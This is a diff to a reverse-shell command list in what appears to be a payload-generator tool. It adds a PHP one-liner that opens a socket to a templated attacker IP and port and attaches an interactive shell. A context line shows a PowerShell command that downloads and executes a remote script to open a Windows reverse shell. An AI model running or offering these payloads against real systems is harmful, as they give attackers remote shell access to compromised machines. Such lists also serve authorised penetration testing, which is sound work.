@@ -150,6 +150,11 @@ const reverseShellCommands = withCommandType(
             "meta": ["linux", "windows", "mac"]
         },
         {
+            "name": "PHP proc_open",
+            "command": "php -r '$sock=fsockopen(\"{ip}\",{port});$proc=proc_open(\"{shell} -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'",
+            "meta": ["linux", "windows", "mac"]
+        },
+        {
             "name": "Windows ConPty",
             "command": "IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell {ip} {port}",
             "meta": ["windows"]
